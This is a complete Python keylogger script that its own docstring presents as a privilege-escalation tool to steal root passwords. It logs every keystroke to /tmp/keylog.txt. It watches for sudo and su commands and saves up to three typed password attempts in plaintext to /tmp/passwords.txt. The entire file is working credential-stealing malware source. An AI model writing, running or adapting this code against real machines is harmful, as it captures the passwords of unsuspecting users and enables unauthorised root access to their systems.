#!/usr/bin/env python3
import os
import sys
import time
import datetime
import re
from pynput import keyboard


"""

privilege escalation module created to still root password
is keylogger payload type that log keys and filter password based on SUDO,SU commands pattern
steps:
1:detect "sudo":string and "su":string pattern from keyboard input keys
2: wait for first ENTER.key and capture first password, keep tracking while ENTER.key < 3
3: save password and keylogs in /tmp:directory

"""


# Configuration
LOG_FILE = "/tmp/keylog.txt" 
PASSWORD_FILE = "/tmp/passwords.txt"
MAX_FILE_SIZE = 1024 * 1024


class PasswordDetector:
    def __init__(self):
        self.buffer = []
        self.command_buffer = []
        self.expecting_password = False
        self.password_context = ""
        self.password_attempts = 0
        
    def process_key(self, key, timestamp):
        key_char = self._get_key_char(key)
        
        if key_char:
            self.command_buffer.append(key_char)
            
        # Check for ENTER key
        if key == keyboard.Key.enter:
            current_command = ''.join(self.command_buffer).strip().lower()
            
            if not self.expecting_password:
                # First ENTER - check if it's a password command
                if self._is_password_command(current_command):
                    self.expecting_password = True
                    self.password_context = current_command
                    self.buffer = []  # Start fresh for password capture
                    print(f"[!] Detected password command: {current_command}")
                    print("[!] Now capturing password until next ENTER...")
            else:
                # Second ENTER - capture the password (remove the last ENTER)
                self._capture_password()
                # DON'T reset expecting_password - keep capturing for multiple attempts
                # Only reset if we've captured 3 attempts or user cancels
                
            # Reset command buffer after ENTER
            self.command_buffer = []
        
        # If we're between the two ENTERs, capture all keys
        elif self.expecting_password:
            if hasattr(key, 'char') and key.char is not None:
                self.buffer.append(key.char)
            elif key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.backspace and self.buffer:
                self.buffer.pop()
            elif key == keyboard.Key.esc or key == keyboard.Key.ctrl:
                # User cancelled password input
                self.expecting_password = False
                self.buffer = []
                print("[!] Password input cancelled")
    
    def _get_key_char(self, key):
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif key == keyboard.Key.space:
            return ' '
        return None
    
    def _is_password_command(self, command):
        """Check if command typically requires password authentication"""
        password_commands = [
            r'^sudo\s+su$',           # sudo su
            r'^sudo\s+su\s+',         # sudo su [options]
            r'^sudo\s+[a-z]',         # sudo [any command]
            r'^su$',                  # su
            r'^su\s+',                # su [options]
        ]
        
        for pattern in password_commands:
            if re.match(pattern, command):
                return True
        return False
    
    def _capture_password(self):
        if self.buffer:
            # Remove any trailing ENTER or newline characters
            password = ''.join(self.buffer).strip()
            if password:  # Only save non-empty passwords
                self.password_attempts += 1
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(PASSWORD_FILE, "a") as f:
                    f.write(f"[{timestamp}] ATTEMPT #{self.password_attempts}: {self.password_context}\n")
                    f.write(f"[{timestamp}] PASSWORD: {password}\n")
                    f.write(f"[{timestamp}] {'-'*50}\n")
                print(f"[!] Password attempt #{self.password_attempts} captured: '{password}'")
                
                # Continue listening for more attempts unless we have 3
                if self.password_attempts >= 3:
                    print("[!] Captured 3 password attempts, resetting...")
                    self.expecting_password = False
                    self.password_attempts = 0
                else:
                    print("[!] Ready for next password attempt...")
                    # Keep expecting password for next attempt
                    self.buffer = []  # Reset buffer for next password
            
        self.buffer = []

def on_press(key, password_detector):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Process for password detection FIRST
        password_detector.process_key(key, timestamp)
        
        # Then do normal logging
        if hasattr(key, 'char') and key.char is not None:
            log_entry = f"{timestamp} - {key.char}\n"
        elif key == keyboard.Key.space:
            log_entry = f"{timestamp} - [SPACE]\n"
        elif key == keyboard.Key.enter:
            log_entry = f"{timestamp} - [ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_entry = f"{timestamp} - [BACKSPACE]\n"
        else:
            log_entry = f"{timestamp} - [{str(key)}]\n"
        
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
            
        # Check file size and rotate if needed
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_FILE_SIZE:
            rotate_log_file()
            
    except Exception as e:
        print(f"Error: {e}")

def rotate_log_file():
    if os.path.exists(LOG_FILE):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = f"{LOG_FILE}.{timestamp}"
        os.rename(LOG_FILE, backup_file)

def main():
    print("Multi-Password Capture Keylogger started.")
    print("Pattern: COMMAND → ENTER → [PASSWORD] → ENTER (multiple attempts)")
    print("Will capture up to 3 password attempts per sudo command")
    print(f"Full log: {LOG_FILE}")
    print(f"Passwords: {PASSWORD_FILE}")
    
    password_detector = PasswordDetector()
    
    # Create listener
    listener = keyboard.Listener(
        on_press=lambda key: on_press(key, password_detector)
    )
    
    try:
        listener.start()
        print("[+] Keylogger is running in real-time. Press Ctrl+C to stop.")
        listener.join()
    except KeyboardInterrupt:
        print("\n[-] Stopping keylogger...")
        listener.stop()
    except Exception as e:
        print(f"Error: {e}")
        listener.stop()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Warning: Running without root privileges may limit key capture")
    
    main()